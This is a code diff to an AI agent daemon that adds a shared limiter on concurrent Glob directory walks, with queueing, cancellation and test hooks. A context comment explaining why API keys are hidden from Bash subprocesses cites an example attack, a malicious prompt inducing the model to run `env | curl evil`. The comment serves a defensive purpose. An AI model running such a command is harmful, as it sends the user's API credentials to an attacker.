@@ -125,6 +125,86 @@ function globTimeoutMs() {
 }
 
 /**
+ * #7356 — a cap on how many Glob walks run at once, DAEMON-WIDE.
+ *
+ * `byok-session.js` fans every approved tool block in one model turn through
+ * `Promise.all`, so one turn can start N walks, and the daemon shares a
+ * 4-thread libuv pool with every Read, permission-floor lstat walk and
+ * dashboard file op. Measured on #7356: 8 concurrent walks of the real
+ * checkout took RSS from 126 to 691 MB. Cancelling a walk at its deadline
+ * (`walkGlob`) bounds how long each one lives; this bounds how many live at
+ * once. Walks past the cap queue FIFO and are NOT lost: they start the moment
+ * a slot frees, and a Glob call's own deadline / abort covers its time in the
+ * queue too (a queued call that times out never starts a walk at all).
+ *
+ * Module-level on purpose: sessions are separate objects but the libuv pool
+ * and the heap are shared. Read per call and overridable via
+ * `CHROXY_GLOB_MAX_CONCURRENT`, same shape as the other Glob knobs, so the
+ * bound can be proven at a testable size. An empty or unparseable value falls
+ * back to the default rather than lifting the bound.
+ */
+const GLOB_MAX_CONCURRENT_DEFAULT = 2
+function globMaxConcurrent() {
+  const raw = (process.env.CHROXY_GLOB_MAX_CONCURRENT || '').trim()
+  if (!/^\d+$/.test(raw)) return GLOB_MAX_CONCURRENT_DEFAULT
+  const n = Number(raw)
+  return n > 0 ? n : GLOB_MAX_CONCURRENT_DEFAULT
+}
+const globWalkSlots = { active: 0, queue: [] }
+
+function pumpGlobWalkSlots() {
+  while (globWalkSlots.queue.length > 0 && globWalkSlots.active < globWalkSlots.queue[0].limit) {
+    const waiter = globWalkSlots.queue.shift()
+    globWalkSlots.active++
+    waiter.resolve(makeGlobSlotRelease())
+  }
+}
+
+function makeGlobSlotRelease() {
+  let released = false
+  return () => {
+    if (released) return
+    released = true
+    globWalkSlots.active--
+    pumpGlobWalkSlots()
+  }
+}
+
+/**
+ * Take a walk slot. `granted` resolves to a `release()` function once a slot
+ * is free, or to `null` if `cancel()` removed this request from the queue
+ * first. `cancel()` is a no-op once the slot has been granted (the walk then
+ * observes `state.stop` itself and releases in its own `finally`).
+ */
+function acquireGlobWalkSlot(limit) {
+  let waiter = null
+  const granted = new Promise((resolve) => {
+    if (globWalkSlots.active < limit) {
+      globWalkSlots.active++
+      resolve(makeGlobSlotRelease())
+      return
+    }
+    waiter = { limit, resolve }
+    globWalkSlots.queue.push(waiter)
+  })
+  return {
+    granted,
+    cancel() {
+      if (!waiter) return
+      const i = globWalkSlots.queue.indexOf(waiter)
+      if (i === -1) return
+      globWalkSlots.queue.splice(i, 1)
+      waiter.resolve(null)
+    },
+  }
+}
+
+/** Test/diagnostic view of the walk limiter: slots in use and requests queued. */
+function globWalkSlotStats() {
+  return { active: globWalkSlots.active, queued: globWalkSlots.queue.length }
+}
+
+/**
  * Env vars the model must NEVER see in a Bash subprocess. Centrally
  * the BYOK API key — if a malicious prompt induces the model to run
  * `env | curl evil`, the model exfiltrates the user's API credentials
@@ -552,12 +632,23 @@ async function runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
   // still checks `state.stop`/the collect ceiling before starting, so a
   // deadline or abort hit partway through stops the REMAINING alternatives
   // too, not just the one in flight.
+  // #7356 — take a walk slot before walking (see `globMaxConcurrent`). The
+  // deadline timer above is already running, so time spent queued counts
+  // against this call's budget; a call that times out or is aborted while
+  // still queued is dequeued below and never starts a walk.
+  const slot = acquireGlobWalkSlot(globMaxConcurrent())
   async function collectAll() {
-    for (const p of patterns) {
-      if (state.stop !== null || files.length >= GLOB_COLLECT_CEILING) return
-      const { matchers } = compileCaseCheck(p)
-      const directoryOnly = p.endsWith('/')
-      await walkGlob({ realRoot, matchers, cwdRealCache, cwdCacheTtl, state, results: files, maxEntries, directoryOnly })
+    const release = await slot.granted
+    if (release === null) return
+    try {
+      for (const p of patterns) {
+        if (state.stop !== null || files.length >= GLOB_COLLECT_CEILING) return
+        const { matchers } = compileCaseCheck(p)
+        const directoryOnly = p.endsWith('/')
+        await walkGlob({ realRoot, matchers, cwdRealCache, cwdCacheTtl, state, results: files, maxEntries, directoryOnly })
+      }
+    } finally {
+      release()
     }
   }
   const collect = collectAll()
@@ -572,6 +663,7 @@ async function runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
   }
   clearTimeout(deadline)
   signal?.removeEventListener?.('abort', onAbort)
+  slot.cancel()
   if (walkError) {
     return { content: `Glob failed: ${walkError?.message || String(walkError)}`, isError: true }
   }
@@ -3236,6 +3328,8 @@ export {
   caseCheckPasses,
   segmentMatches,
   walkGlob,
+  acquireGlobWalkSlot,
+  globWalkSlotStats,
   expandBraces,
   GLOB_BRACE_EXPANSION_CAP,
   parseRangeGroup,
